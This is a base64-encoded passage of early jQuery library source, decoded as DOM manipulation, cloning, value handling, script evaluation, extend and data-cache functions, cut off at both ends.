HRvIHdyYXAgdGhlIHRhcmdldCBhcm91bmQKCQkJalF1ZXJ5KCBodG1sLCB0aGlzWzBdLm93bmVyRG9jdW1lbnQgKQoJCQkJLmNsb25lKCkKCQkJCS5pbnNlcnRCZWZvcmUoIHRoaXNbMF0gKQoJCQkJLm1hcChmdW5jdGlvbigpewoJCQkJCXZhciBlbGVtID0gdGhpczsKCgkJCQkJd2hpbGUgKCBlbGVtLmZpcnN0Q2hpbGQgKQoJCQkJCQllbGVtID0gZWxlbS5maXJzdENoaWxkOwoKCQkJCQlyZXR1cm4gZWxlbTsKCQkJCX0pCgkJCQkuYXBwZW5kKHRoaXMpOwoKCQlyZXR1cm4gdGhpczsKCX0sCgoJd3JhcElubmVyOiBmdW5jdGlvbiggaHRtbCApIHsKCQlyZXR1cm4gdGhpcy5lYWNoKGZ1bmN0aW9uKCl7CgkJCWpRdWVyeSggdGhpcyApLmNvbnRlbnRzKCkud3JhcEFsbCggaHRtbCApOwoJCX0pOwoJfSwKCgl3cmFwOiBmdW5jdGlvbiggaHRtbCApIHsKCQlyZXR1cm4gdGhpcy5lYWNoKGZ1bmN0aW9uKCl7CgkJCWpRdWVyeSggdGhpcyApLndyYXBBbGwoIGh0bWwgKTsKCQl9KTsKCX0sCgoJYXBwZW5kOiBmdW5jdGlvbigpIHsKCQlyZXR1cm4gdGhpcy5kb21NYW5pcChhcmd1bWVudHMsIHRydWUsIGZhbHNlLCBmdW5jdGlvbihlbGVtKXsKCQkJaWYgKHRoaXMubm9kZVR5cGUgPT0gMSkKCQkJCXRoaXMuYXBwZW5kQ2hpbGQoIGVsZW0gKTsKCQl9KTsKCX0sCgoJcHJlcGVuZDogZnVuY3Rpb24oKSB7CgkJcmV0dXJuIHRoaXMuZG9tTWFuaXAoYXJndW1lbnRzLCB0cnVlLCB0cnVlLCBmdW5jdGlvbihlbGVtKXsKCQkJaWYgKHRoaXMubm9kZVR5cGUgPT0gMSkKCQkJCXRoaXMuaW5zZXJ0QmVmb3JlKCBlbGVtLCB0aGlzLmZpcnN0Q2hpbGQgKTsKCQl9KTsKCX0sCgkKCWJlZm9yZTogZnVuY3Rpb24oKSB7CgkJcmV0dXJuIHRoaXMuZG9tTWFuaXAoYXJndW1lbnRzLCBmYWxzZSwgZmFsc2UsIGZ1bmN0aW9uKGVsZW0pewoJCQl0aGlzLnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKCBlbGVtLCB0aGlzICk7CgkJfSk7Cgl9LAoKCWFmdGVyOiBmdW5jdGlvbigpIHsKCQlyZXR1cm4gdGhpcy5kb21NYW5pcChhcmd1bWVudHMsIGZhbHNlLCB0cnVlLCBmdW5jdGlvbihlbGVtKXsKCQkJdGhpcy5wYXJlbnROb2RlLmluc2VydEJlZm9yZSggZWxlbSwgdGhpcy5uZXh0U2libGluZyApOwoJCX0pOwoJfSwKCgllbmQ6IGZ1bmN0aW9uKCkgewoJCXJldHVybiB0aGlzLnByZXZPYmplY3QgfHwgalF1ZXJ5KCBbXSApOwoJfSwKCglmaW5kOiBmdW5jdGlvbiggc2VsZWN0b3IgKSB7CgkJdmFyIGVsZW1zID0galF1ZXJ5Lm1hcCh0aGlzLCBmdW5jdGlvbihlbGVtKXsKCQkJcmV0dXJuIGpRdWVyeS5maW5kKCBzZWxlY3RvciwgZWxlbSApOwoJCX0pOwoKCQlyZXR1cm4gdGhpcy5wdXNoU3RhY2soIC9bXis+XSBbXis+XS8udGVzdCggc2VsZWN0b3IgKSB8fCBzZWxlY3Rvci5pbmRleE9mKCIuLiIpID4gLTEgPwoJCQlqUXVlcnkudW5pcXVlKCBlbGVtcyApIDoKCQkJZWxlbXMgKTsKCX0sCgoJY2xvbmU6IGZ1bmN0aW9uKCBldmVudHMgKSB7CgkJLy8gRG8gdGhlIGNsb25lCgkJdmFyIHJldCA9IHRoaXMubWFwKGZ1bmN0aW9uKCl7CgkJCWlmICggalF1ZXJ5LmJyb3dzZXIubXNpZSAmJiAhalF1ZXJ5LmlzWE1MRG9jKHRoaXMpICkgewoJCQkJLy8gSUUgY29waWVzIGV2ZW50cyBib3VuZCB2aWEgYXR0YWNoRXZlbnQgd2hlbgoJCQkJLy8gdXNpbmcgY2xvbmVOb2RlLiBDYWxsaW5nIGRldGFjaEV2ZW50IG9uIHRoZQoJCQkJLy8gY2xvbmUgd2lsbCBhbHNvIHJlbW92ZSB0aGUgZXZlbnRzIGZyb20gdGhlIG9yaWduYWwKCQkJCS8vIEluIG9yZGVyIHRvIGdldCBhcm91bmQgdGhpcywgd2UgdXNlIGlubmVySFRNTC4KCQkJCS8vIFVuZm9ydHVuYXRlbHksIHRoaXMgbWVhbnMgc29tZSBtb2RpZmljYXRpb25zIHRvIAoJCQkJLy8gYXR0cmlidXRlcyBpbiBJRSB0aGF0IGFyZSBhY3R1YWxseSBvbmx5IHN0b3JlZCAKCQkJCS8vIGFzIHByb3BlcnRpZXMgd2lsbCBub3QgYmUgY29waWVkIChzdWNoIGFzIHRoZQoJCQkJLy8gdGhlIG5hbWUgYXR0cmlidXRlIG9uIGFuIGlucHV0KS4KCQkJCXZhciBjbG9uZSA9IHRoaXMuY2xvbmVOb2RlKHRydWUpLAoJCQkJCWNvbnRhaW5lciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwoJCQkJY29udGFpbmVyLmFwcGVuZENoaWxkKGNsb25lKTsKCQkJCXJldHVybiBqUXVlcnkuY2xlYW4oW2NvbnRhaW5lci5pbm5lckhUTUxdKVswXTsKCQkJfSBlbHNlCgkJCQlyZXR1cm4gdGhpcy5jbG9uZU5vZGUodHJ1ZSk7CgkJfSk7CgoJCS8vIE5lZWQgdG8gc2V0IHRoZSBleHBhbmRvIHRvIG51bGwgb24gdGhlIGNsb25lZCBzZXQgaWYgaXQgZXhpc3RzCgkJLy8gcmVtb3ZlRGF0YSBkb2Vzbid0IHdvcmsgaGVyZSwgSUUgcmVtb3ZlcyBpdCBmcm9tIHRoZSBvcmlnaW5hbCBhcyB3ZWxsCgkJLy8gdGhpcyBpcyBwcmltYXJpbHkgZm9yIElFIGJ1dCB0aGUgZGF0YSBleHBhbmRvIHNob3VsZG4ndCBiZSBjb3BpZWQgb3ZlciBpbiBhbnkgYnJvd3NlcgoJCXZhciBjbG9uZSA9IHJldC5maW5kKCIqIikuYW5kU2VsZigpLmVhY2goZnVuY3Rpb24oKXsKCQkJaWYgKCB0aGlzWyBleHBhbmRvIF0gIT0gdW5kZWZpbmVkICkKCQkJCXRoaXNbIGV4cGFuZG8gXSA9IG51bGw7CgkJfSk7CgkJCgkJLy8gQ29weSB0aGUgZXZlbnRzIGZyb20gdGhlIG9yaWdpbmFsIHRvIHRoZSBjbG9uZQoJCWlmICggZXZlbnRzID09PSB0cnVlICkKCQkJdGhpcy5maW5kKCIqIikuYW5kU2VsZigpLmVhY2goZnVuY3Rpb24oaSl7CgkJCQlpZiAodGhpcy5ub2RlVHlwZSA9PSAzKQoJCQkJCXJldHVybjsKCQkJCXZhciBldmVudHMgPSBqUXVlcnkuZGF0YSggdGhpcywgImV2ZW50cyIgKTsKCgkJCQlmb3IgKCB2YXIgdHlwZSBpbiBldmVudHMgKQoJCQkJCWZvciAoIHZhciBoYW5kbGVyIGluIGV2ZW50c1sgdHlwZSBdICkKCQkJCQkJalF1ZXJ5LmV2ZW50LmFkZCggY2xvbmVbIGkgXSwgdHlwZSwgZXZlbnRzWyB0eXBlIF1bIGhhbmRsZXIgXSwgZXZlbnRzWyB0eXBlIF1bIGhhbmRsZXIgXS5kYXRhICk7CgkJCX0pOwoKCQkvLyBSZXR1cm4gdGhlIGNsb25lZCBzZXQKCQlyZXR1cm4gcmV0OwoJfSwKCglmaWx0ZXI6IGZ1bmN0aW9uKCBzZWxlY3RvciApIHsKCQlyZXR1cm4gdGhpcy5wdXNoU3RhY2soCgkJCWpRdWVyeS5pc0Z1bmN0aW9uKCBzZWxlY3RvciApICYmCgkJCWpRdWVyeS5ncmVwKHRoaXMsIGZ1bmN0aW9uKGVsZW0sIGkpewoJCQkJcmV0dXJuIHNlbGVjdG9yLmNhbGwoIGVsZW0sIGkgKTsKCQkJfSkgfHwKCgkJCWpRdWVyeS5tdWx0aUZpbHRlciggc2VsZWN0b3IsIHRoaXMgKSApOwoJfSwKCglub3Q6IGZ1bmN0aW9uKCBzZWxlY3RvciApIHsKCQlpZiAoIHNlbGVjdG9yLmNvbnN0cnVjdG9yID09IFN0cmluZyApCgkJCS8vIHRlc3Qgc3BlY2lhbCBjYXNlIHdoZXJlIGp1c3Qgb25lIHNlbGVjdG9yIGlzIHBhc3NlZCBpbgoJCQlpZiAoIGlzU2ltcGxlLnRlc3QoIHNlbGVjdG9yICkgKQoJCQkJcmV0dXJuIHRoaXMucHVzaFN0YWNrKCBqUXVlcnkubXVsdGlGaWx0ZXIoIHNlbGVjdG9yLCB0aGlzLCB0cnVlICkgKTsKCQkJZWxzZQoJCQkJc2VsZWN0b3IgPSBqUXVlcnkubXVsdGlGaWx0ZXIoIHNlbGVjdG9yLCB0aGlzICk7CgoJCXZhciBpc0FycmF5TGlrZSA9IHNlbGVjdG9yLmxlbmd0aCAmJiBzZWxlY3RvcltzZWxlY3Rvci5sZW5ndGggLSAxXSAhPT0gdW5kZWZpbmVkICYmICFzZWxlY3Rvci5ub2RlVHlwZTsKCQlyZXR1cm4gdGhpcy5maWx0ZXIoZnVuY3Rpb24oKSB7CgkJCXJldHVybiBpc0FycmF5TGlrZSA/IGpRdWVyeS5pbkFycmF5KCB0aGlzLCBzZWxlY3RvciApIDwgMCA6IHRoaXMgIT0gc2VsZWN0b3I7CgkJfSk7Cgl9LAoKCWFkZDogZnVuY3Rpb24oIHNlbGVjdG9yICkgewoJCXJldHVybiAhc2VsZWN0b3IgPyB0aGlzIDogdGhpcy5wdXNoU3RhY2soIGpRdWVyeS5tZXJnZSggCgkJCXRoaXMuZ2V0KCksCgkJCXNlbGVjdG9yLmNvbnN0cnVjdG9yID09IFN0cmluZyA/IAoJCQkJalF1ZXJ5KCBzZWxlY3RvciApLmdldCgpIDoKCQkJCXNlbGVjdG9yLmxlbmd0aCAhPSB1bmRlZmluZWQgJiYgKCFzZWxlY3Rvci5ub2RlTmFtZSB8fCBqUXVlcnkubm9kZU5hbWUoc2VsZWN0b3IsICJmb3JtIikpID8KCQkJCQlzZWxlY3RvciA6IFtzZWxlY3Rvcl0gKSApOwoJfSwKCglpczogZnVuY3Rpb24oIHNlbGVjdG9yICkgewoJCXJldHVybiBzZWxlY3RvciA/CgkJCWpRdWVyeS5tdWx0aUZpbHRlciggc2VsZWN0b3IsIHRoaXMgKS5sZW5ndGggPiAwIDoKCQkJZmFsc2U7Cgl9LAoKCWhhc0NsYXNzOiBmdW5jdGlvbiggc2VsZWN0b3IgKSB7CgkJcmV0dXJuIHRoaXMuaXMoICIuIiArIHNlbGVjdG9yICk7Cgl9LAoJCgl2YWw6IGZ1bmN0aW9uKCB2YWx1ZSApIHsKCQlpZiAoIHZhbHVlID09IHVuZGVmaW5lZCApIHsKCgkJCWlmICggdGhpcy5sZW5ndGggKSB7CgkJCQl2YXIgZWxlbSA9IHRoaXNbMF07CgoJCQkJLy8gV2UgbmVlZCB0byBoYW5kbGUgc2VsZWN0IGJveGVzIHNwZWNpYWwKCQkJCWlmICggalF1ZXJ5Lm5vZGVOYW1lKCBlbGVtLCAic2VsZWN0IiApICkgewoJCQkJCXZhciBpbmRleCA9IGVsZW0uc2VsZWN0ZWRJbmRleCwKCQkJCQkJdmFsdWVzID0gW10sCgkJCQkJCW9wdGlvbnMgPSBlbGVtLm9wdGlvbnMsCgkJCQkJCW9uZSA9IGVsZW0udHlwZSA9PSAic2VsZWN0LW9uZSI7CgkJCQkJCgkJCQkJLy8gTm90aGluZyB3YXMgc2VsZWN0ZWQKCQkJCQlpZiAoIGluZGV4IDwgMCApCgkJCQkJCXJldHVybiBudWxsOwoKCQkJCQkvLyBMb29wIHRocm91Z2ggYWxsIHRoZSBzZWxlY3RlZCBvcHRpb25zCgkJCQkJZm9yICggdmFyIGkgPSBvbmUgPyBpbmRleCA6IDAsIG1heCA9IG9uZSA/IGluZGV4ICsgMSA6IG9wdGlvbnMubGVuZ3RoOyBpIDwgbWF4OyBpKysgKSB7CgkJCQkJCXZhciBvcHRpb24gPSBvcHRpb25zWyBpIF07CgoJCQkJCQlpZiAoIG9wdGlvbi5zZWxlY3RlZCApIHsKCQkJCQkJCS8vIEdldCB0aGUgc3BlY2lmYyB2YWx1ZSBmb3IgdGhlIG9wdGlvbgoJCQkJCQkJdmFsdWUgPSBqUXVlcnkuYnJvd3Nlci5tc2llICYmICFvcHRpb24uYXR0cmlidXRlcy52YWx1ZS5zcGVjaWZpZWQgPyBvcHRpb24udGV4dCA6IG9wdGlvbi52YWx1ZTsKCQkJCQkJCQoJCQkJCQkJLy8gV2UgZG9uJ3QgbmVlZCBhbiBhcnJheSBmb3Igb25lIHNlbGVjdHMKCQkJCQkJCWlmICggb25lICkKCQkJCQkJCQlyZXR1cm4gdmFsdWU7CgkJCQkJCQkKCQkJCQkJCS8vIE11bHRpLVNlbGVjdHMgcmV0dXJuIGFuIGFycmF5CgkJCQkJCQl2YWx1ZXMucHVzaCggdmFsdWUgKTsKCQkJCQkJfQoJCQkJCX0KCQkJCQkKCQkJCQlyZXR1cm4gdmFsdWVzOwoJCQkJCQoJCQkJLy8gRXZlcnl0aGluZyBlbHNlLCB3ZSBqdXN0IGdyYWIgdGhlIHZhbHVlCgkJCQl9IGVsc2UKCQkJCQlyZXR1cm4gKHRoaXNbMF0udmFsdWUgfHwgIiIpLnJlcGxhY2UoL1xyL2csICIiKTsKCgkJCX0KCgkJCXJldHVybiB1bmRlZmluZWQ7CgkJfQoKCQlyZXR1cm4gdGhpcy5lYWNoKGZ1bmN0aW9uKCl7CgkJCWlmICggdGhpcy5ub2RlVHlwZSAhPSAxICkKCQkJCXJldHVybjsKCgkJCWlmICggdmFsdWUuY29uc3RydWN0b3IgPT0gQXJyYXkgJiYgL3JhZGlvfGNoZWNrYm94Ly50ZXN0KCB0aGlzLnR5cGUgKSApCgkJCQl0aGlzLmNoZWNrZWQgPSAoalF1ZXJ5LmluQXJyYXkodGhpcy52YWx1ZSwgdmFsdWUpID49IDAgfHwKCQkJCQlqUXVlcnkuaW5BcnJheSh0aGlzLm5hbWUsIHZhbHVlKSA+PSAwKTsKCgkJCWVsc2UgaWYgKCBqUXVlcnkubm9kZU5hbWUoIHRoaXMsICJzZWxlY3QiICkgKSB7CgkJCQl2YXIgdmFsdWVzID0gdmFsdWUuY29uc3RydWN0b3IgPT0gQXJyYXkgPwoJCQkJCXZhbHVlIDoKCQkJCQlbIHZhbHVlIF07CgoJCQkJalF1ZXJ5KCAib3B0aW9uIiwgdGhpcyApLmVhY2goZnVuY3Rpb24oKXsKCQkJCQl0aGlzLnNlbGVjdGVkID0gKGpRdWVyeS5pbkFycmF5KCB0aGlzLnZhbHVlLCB2YWx1ZXMgKSA+PSAwIHx8CgkJCQkJCWpRdWVyeS5pbkFycmF5KCB0aGlzLnRleHQsIHZhbHVlcyApID49IDApOwoJCQkJfSk7CgoJCQkJaWYgKCAhdmFsdWVzLmxlbmd0aCApCgkJCQkJdGhpcy5zZWxlY3RlZEluZGV4ID0gLTE7CgoJCQl9IGVsc2UKCQkJCXRoaXMudmFsdWUgPSB2YWx1ZTsKCQl9KTsKCX0sCgkKCWh0bWw6IGZ1bmN0aW9uKCB2YWx1ZSApIHsKCQlyZXR1cm4gdmFsdWUgPT0gdW5kZWZpbmVkID8KCQkJKHRoaXMubGVuZ3RoID8KCQkJCXRoaXNbMF0uaW5uZXJIVE1MIDoKCQkJCW51bGwpIDoKCQkJdGhpcy5lbXB0eSgpLmFwcGVuZCggdmFsdWUgKTsKCX0sCgoJcmVwbGFjZVdpdGg6IGZ1bmN0aW9uKCB2YWx1ZSApIHsKCQlyZXR1cm4gdGhpcy5hZnRlciggdmFsdWUgKS5yZW1vdmUoKTsKCX0sCgoJZXE6IGZ1bmN0aW9uKCBpICkgewoJCXJldHVybiB0aGlzLnNsaWNlKCBpLCBpICsgMSApOwoJfSwKCglzbGljZTogZnVuY3Rpb24oKSB7CgkJcmV0dXJuIHRoaXMucHVzaFN0YWNrKCBBcnJheS5wcm90b3R5cGUuc2xpY2UuYXBwbHkoIHRoaXMsIGFyZ3VtZW50cyApICk7Cgl9LAoKCW1hcDogZnVuY3Rpb24oIGNhbGxiYWNrICkgewoJCXJldHVybiB0aGlzLnB1c2hTdGFjayggalF1ZXJ5Lm1hcCh0aGlzLCBmdW5jdGlvbihlbGVtLCBpKXsKCQkJcmV0dXJuIGNhbGxiYWNrLmNhbGwoIGVsZW0sIGksIGVsZW0gKTsKCQl9KSk7Cgl9LAoKCWFuZFNlbGY6IGZ1bmN0aW9uKCkgewoJCXJldHVybiB0aGlzLmFkZCggdGhpcy5wcmV2T2JqZWN0ICk7Cgl9LAoJCglkb21NYW5pcDogZnVuY3Rpb24oIGFyZ3MsIHRhYmxlLCByZXZlcnNlLCBjYWxsYmFjayApIHsKCQl2YXIgY2xvbmUgPSB0aGlzLmxlbmd0aCA+IDEsIGVsZW1zOyAKCgkJcmV0dXJuIHRoaXMuZWFjaChmdW5jdGlvbigpewoJCQlpZiAoICFlbGVtcyApIHsKCQkJCWVsZW1zID0galF1ZXJ5LmNsZWFuKCBhcmdzLCB0aGlzLm93bmVyRG9jdW1lbnQgKTsKCgkJCQlpZiAoIHJldmVyc2UgKQoJCQkJCWVsZW1zLnJldmVyc2UoKTsKCQkJfQoKCQkJdmFyIG9iaiA9IHRoaXM7CgoJCQlpZiAoIHRhYmxlICYmIGpRdWVyeS5ub2RlTmFtZSggdGhpcywgInRhYmxlIiApICYmIGpRdWVyeS5ub2RlTmFtZSggZWxlbXNbMF0sICJ0ciIgKSApCgkJCQlvYmogPSB0aGlzLmdldEVsZW1lbnRzQnlUYWdOYW1lKCJ0Ym9keSIpWzBdIHx8IHRoaXMuYXBwZW5kQ2hpbGQoIHRoaXMub3duZXJEb2N1bWVudC5jcmVhdGVFbGVtZW50KCJ0Ym9keSIpICk7CgoJCQl2YXIgc2NyaXB0cyA9IGpRdWVyeSggW10gKTsKCgkJCWpRdWVyeS5lYWNoKGVsZW1zLCBmdW5jdGlvbigpewoJCQkJdmFyIGVsZW0gPSBjbG9uZSA/CgkJCQkJalF1ZXJ5KCB0aGlzICkuY2xvbmUoIHRydWUgKVswXSA6CgkJCQkJdGhpczsKCgkJCQkvLyBleGVjdXRlIGFsbCBzY3JpcHRzIGFmdGVyIHRoZSBlbGVtZW50cyBoYXZlIGJlZW4gaW5qZWN0ZWQKCQkJCWlmICggalF1ZXJ5Lm5vZGVOYW1lKCBlbGVtLCAic2NyaXB0IiApICkgewoJCQkJCXNjcmlwdHMgPSBzY3JpcHRzLmFkZCggZWxlbSApOwoJCQkJfSBlbHNlIHsKCQkJCQkvLyBSZW1vdmUgYW55IGlubmVyIHNjcmlwdHMgZm9yIGxhdGVyIGV2YWx1YXRpb24KCQkJCQlpZiAoIGVsZW0ubm9kZVR5cGUgPT0gMSApCgkJCQkJCXNjcmlwdHMgPSBzY3JpcHRzLmFkZCggalF1ZXJ5KCAic2NyaXB0IiwgZWxlbSApLnJlbW92ZSgpICk7CgoJCQkJCS8vIEluamVjdCB0aGUgZWxlbWVudHMgaW50byB0aGUgZG9jdW1lbnQKCQkJCQljYWxsYmFjay5jYWxsKCBvYmosIGVsZW0gKTsKCQkJCX0KCQkJfSk7CgoJCQlzY3JpcHRzLmVhY2goIGV2YWxTY3JpcHQgKTsKCQl9KTsKCX0KfTsKCi8vIEdpdmUgdGhlIGluaXQgZnVuY3Rpb24gdGhlIGpRdWVyeSBwcm90b3R5cGUgZm9yIGxhdGVyIGluc3RhbnRpYXRpb24KalF1ZXJ5LnByb3RvdHlwZS5pbml0LnByb3RvdHlwZSA9IGpRdWVyeS5wcm90b3R5cGU7CgpmdW5jdGlvbiBldmFsU2NyaXB0KCBpLCBlbGVtICkgewoJaWYgKCBlbGVtLnNyYyApCgkJalF1ZXJ5LmFqYXgoewoJCQl1cmw6IGVsZW0uc3JjLAoJCQlhc3luYzogZmFsc2UsCgkJCWRhdGFUeXBlOiAic2NyaXB0IgoJCX0pOwoKCWVsc2UKCQlqUXVlcnkuZ2xvYmFsRXZhbCggZWxlbS50ZXh0IHx8IGVsZW0udGV4dENvbnRlbnQgfHwgZWxlbS5pbm5lckhUTUwgfHwgIiIgKTsKCglpZiAoIGVsZW0ucGFyZW50Tm9kZSApCgkJZWxlbS5wYXJlbnROb2RlLnJlbW92ZUNoaWxkKCBlbGVtICk7Cn0KCmpRdWVyeS5leHRlbmQgPSBqUXVlcnkuZm4uZXh0ZW5kID0gZnVuY3Rpb24oKSB7CgkvLyBjb3B5IHJlZmVyZW5jZSB0byB0YXJnZXQgb2JqZWN0Cgl2YXIgdGFyZ2V0ID0gYXJndW1lbnRzWzBdIHx8IHt9LCBpID0gMSwgbGVuZ3RoID0gYXJndW1lbnRzLmxlbmd0aCwgZGVlcCA9IGZhbHNlLCBvcHRpb25zOwoKCS8vIEhhbmRsZSBhIGRlZXAgY29weSBzaXR1YXRpb24KCWlmICggdGFyZ2V0LmNvbnN0cnVjdG9yID09IEJvb2xlYW4gKSB7CgkJZGVlcCA9IHRhcmdldDsKCQl0YXJnZXQgPSBhcmd1bWVudHNbMV0gfHwge307CgkJLy8gc2tpcCB0aGUgYm9vbGVhbiBhbmQgdGhlIHRhcmdldAoJCWkgPSAyOwoJfQoKCS8vIEhhbmRsZSBjYXNlIHdoZW4gdGFyZ2V0IGlzIGEgc3RyaW5nIG9yIHNvbWV0aGluZyAocG9zc2libGUgaW4gZGVlcCBjb3B5KQoJaWYgKCB0eXBlb2YgdGFyZ2V0ICE9ICJvYmplY3QiICYmIHR5cGVvZiB0YXJnZXQgIT0gImZ1bmN0aW9uIiApCgkJdGFyZ2V0ID0ge307CgoJLy8gZXh0ZW5kIGpRdWVyeSBpdHNlbGYgaWYgb25seSBvbmUgYXJndW1lbnQgaXMgcGFzc2VkCglpZiAoIGxlbmd0aCA9PSAxICkgewoJCXRhcmdldCA9IHRoaXM7CgkJaSA9IDA7Cgl9CgoJZm9yICggOyBpIDwgbGVuZ3RoOyBpKysgKQoJCS8vIE9ubHkgZGVhbCB3aXRoIG5vbi1udWxsL3VuZGVmaW5lZCB2YWx1ZXMKCQlpZiAoIChvcHRpb25zID0gYXJndW1lbnRzWyBpIF0pICE9IG51bGwgKQoJCQkvLyBFeHRlbmQgdGhlIGJhc2Ugb2JqZWN0CgkJCWZvciAoIHZhciBuYW1lIGluIG9wdGlvbnMgKSB7CgkJCQkvLyBQcmV2ZW50IG5ldmVyLWVuZGluZyBsb29wCgkJCQlpZiAoIHRhcmdldCA9PT0gb3B0aW9uc1sgbmFtZSBdICkKCQkJCQljb250aW51ZTsKCgkJCQkvLyBSZWN1cnNlIGlmIHdlJ3JlIG1lcmdpbmcgb2JqZWN0IHZhbHVlcwoJCQkJaWYgKCBkZWVwICYmIG9wdGlvbnNbIG5hbWUgXSAmJiB0eXBlb2Ygb3B0aW9uc1sgbmFtZSBdID09ICJvYmplY3QiICYmIHRhcmdldFsgbmFtZSBdICYmICFvcHRpb25zWyBuYW1lIF0ubm9kZVR5cGUgKQoJCQkJCXRhcmdldFsgbmFtZSBdID0galF1ZXJ5LmV4dGVuZCggdGFyZ2V0WyBuYW1lIF0sIG9wdGlvbnNbIG5hbWUgXSApOwoKCQkJCS8vIERvbid0IGJyaW5nIGluIHVuZGVmaW5lZCB2YWx1ZXMKCQkJCWVsc2UgaWYgKCBvcHRpb25zWyBuYW1lIF0gIT0gdW5kZWZpbmVkICkKCQkJCQl0YXJnZXRbIG5hbWUgXSA9IG9wdGlvbnNbIG5hbWUgXTsKCgkJCX0KCgkvLyBSZXR1cm4gdGhlIG1vZGlmaWVkIG9iamVjdAoJcmV0dXJuIHRhcmdldDsKfTsKCnZhciBleHBhbmRvID0gImpRdWVyeSIgKyAobmV3IERhdGUoKSkuZ2V0VGltZSgpLCB1dWlkID0gMCwgd2luZG93RGF0YSA9IHt9OwoKLy8gZXhjbHVkZSB0aGUgZm9sbG93aW5nIGNzcyBwcm9wZXJ0aWVzIHRvIGFkZCBweAp2YXIgZXhjbHVkZSA9IC96LT9pbmRleHxmb250LT93ZWlnaHR8b3BhY2l0eXx6b29tfGxpbmUtP2hlaWdodC9pOwoKalF1ZXJ5LmV4dGVuZCh7Cglub0NvbmZsaWN0OiBmdW5jdGlvbiggZGVlcCApIHsKCQl3aW5kb3cuJCA9IF8kOwoKCQlpZiAoIGRlZXAgKQoJCQl3aW5kb3cualF1ZXJ5ID0gX2pRdWVyeTsKCgkJcmV0dXJuIGpRdWVyeTsKCX0sCgoJLy8gU2VlIHRlc3QvdW5pdC9jb3JlLmpzIGZvciBkZXRhaWxzIGNvbmNlcm5pbmcgdGhpcyBmdW5jdGlvbi4KCWlzRnVuY3Rpb246IGZ1bmN0aW9uKCBmbiApIHsKCQlyZXR1cm4gISFmbiAmJiB0eXBlb2YgZm4gIT0gInN0cmluZyIgJiYgIWZuLm5vZGVOYW1lICYmIAoJCQlmbi5jb25zdHJ1Y3RvciAhPSBBcnJheSAmJiAvZnVuY3Rpb24vaS50ZXN0KCBmbiArICIiICk7Cgl9LAoJCgkvLyBjaGVjayBpZiBhbiBlbGVtZW50IGlzIGluIGEgKG9yIGlzIGFuKSBYTUwgZG9jdW1lbnQKCWlzWE1MRG9jOiBmdW5jdGlvbiggZWxlbSApIHsKCQlyZXR1cm4gZWxlbS5kb2N1bWVudEVsZW1lbnQgJiYgIWVsZW0uYm9keSB8fAoJCQllbGVtLnRhZ05hbWUgJiYgZWxlbS5vd25lckRvY3VtZW50ICYmICFlbGVtLm93bmVyRG9jdW1lbnQuYm9keTsKCX0sCgoJLy8gRXZhbHVsYXRlcyBhIHNjcmlwdCBpbiBhIGdsb2JhbCBjb250ZXh0CglnbG9iYWxFdmFsOiBmdW5jdGlvbiggZGF0YSApIHsKCQlkYXRhID0galF1ZXJ5LnRyaW0oIGRhdGEgKTsKCgkJaWYgKCBkYXRhICkgewoJCQkvLyBJbnNwaXJlZCBieSBjb2RlIGJ5IEFuZHJlYSBHaWFtbWFyY2hpCgkJCS8vIGh0dHA6Ly93ZWJyZWZsZWN0aW9uLmJsb2dzcG90LmNvbS8yMDA3LzA4L2dsb2JhbC1zY29wZS1ldmFsdWF0aW9uLWFuZC1kb20uaHRtbAoJCQl2YXIgaGVhZCA9IGRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCJoZWFkIilbMF0gfHwgZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50LAoJCQkJc2NyaXB0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7CgoJCQlzY3JpcHQudHlwZSA9ICJ0ZXh0L2phdmFzY3JpcHQiOwoJCQlpZiAoIGpRdWVyeS5icm93c2VyLm1zaWUgKQoJCQkJc2NyaXB0LnRleHQgPSBkYXRhOwoJCQllbHNlCgkJCQlzY3JpcHQuYXBwZW5kQ2hpbGQoIGRvY3VtZW50LmNyZWF0ZVRleHROb2RlKCBkYXRhICkgKTsKCgkJCWhlYWQuYXBwZW5kQ2hpbGQoIHNjcmlwdCApOwoJCQloZWFkLnJlbW92ZUNoaWxkKCBzY3JpcHQgKTsKCQl9Cgl9LAoKCW5vZGVOYW1lOiBmdW5jdGlvbiggZWxlbSwgbmFtZSApIHsKCQlyZXR1cm4gZWxlbS5ub2RlTmFtZSAmJiBlbGVtLm5vZGVOYW1lLnRvVXBwZXJDYXNlKCkgPT0gbmFtZS50b1VwcGVyQ2FzZSgpOwoJfSwKCQoJY2FjaGU6IHt9LAoJCglkYXRhOiBmdW5jdGlvbiggZWxlbSwgbmFtZSwgZGF0YSApIHsKCQllbGVtID0gZWxlbSA9PSB3aW5kb3cgPwoJCQl3aW5kb3dEYXRhIDoKCQkJZWxlbTsKCgkJdmFyIGlkID0gZWxlbVsgZXhwYW5kbyBdOwoKCQkvLyBDb21wdXRlIGEgdW5pcXVlIElEIGZvciB0aGUgZWxlbWVudAoJCWlmICggIWlkICkgCgkJCWlkID0gZWxlbVsgZXhwYW5kbyBdID0gKyt1dWlkOwoKCQkvLyBPbmx5IGdlbmVyYXRlIHRoZSBkYXRhIGNhY2hlIGlmIHdlJ3JlCgkJLy8gdHJ5aW5nIHRvIGFjY2VzcyBvciBtYW5pcHVsYXRlIGl0CgkJaWYgKCBuYW1lICYmICFqUXVlcnkuY2FjaGVbIGlkIF0gKQoJCQlqUXVlcnkuY2FjaGVbIGlkIF0gPSB7fTsKCQkKCQkvLyBQcmV2ZW50IG92ZXJyaWRpbmcgdGhlIG5hbWVkIGNhY2hlIHdpdGggdW5kZWZpbmVkIHZhbHVlcwoJCWlmICggZGF0YSAhPSB1bmRlZmluZWQgKQoJCQlqUXVlcnkuY2FjaGVbIGlkIF1bIG5hbWUgXSA9IGRhdGE7CgkJCgkJLy8gUmV0dXJuIHRoZSBuYW1lZCBjYWNoZSBkYXRhLCBvciB0aGUgSUQgZm9yIHRoZSBlbGVtZW50CQoJCXJldHVybiBuYW1lID8KCQkJalF1ZXJ5LmNhY2hlWyBpZCBdWyBuYW1lIF0gOgoJCQlpZDsKCX0sCgkKCXJlbW92ZURhdGE6IGZ1bmN0aW9uKCBlbGVtLCBuYW1lICkgewoJCWVsZW0gPSBlbGVtID09IHdpbmRvdyA/CgkJCXdpbmRvd0RhdGEgOgoJCQllbGVtOwoKCQl2YXIgaWQgPSBlbGVtWyBleHBhbmRvIF07CgoJCS8vIElmI